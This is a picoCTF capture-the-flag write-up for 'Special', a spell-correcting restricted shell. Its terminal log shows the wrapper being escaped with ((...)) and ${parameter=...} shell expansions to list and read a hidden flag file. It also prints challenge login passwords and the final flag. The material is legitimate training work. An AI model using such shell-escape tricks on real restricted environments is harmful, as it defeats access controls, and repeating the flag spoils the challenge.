### Descripción
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.
Additional details will be available after launching your challenge instance.

Start your instance to see connection details.`ssh -p 58556 ctf-player@saturn.picoctf.net`The password is `af86add3`

Hints:
1. Experiment with different shell syntax


```
Server: saturn.picoctf.net
Port: 63269
Username: picoplayer 
Password: 5wf1w1hVxt
```
### Solución
Con Webshell

```
Sebas115-picoctf@webshell:~$ ssh -p 49962 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:49962 ([13.59.203.175]:49962)' can't be established.
ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:49962' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ ((ls))
((ls)) 
blargh
Special$ ((cd)) < blargh 
((cd)) < large 
sh: 1: cannot open large: No such file
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cat blargh}
${parameter=cat blargh} 
cat: blargh: Is a directory
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}

```


picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}

### Notas adicionales


### Referencias
https://webshell.picoctf.org/





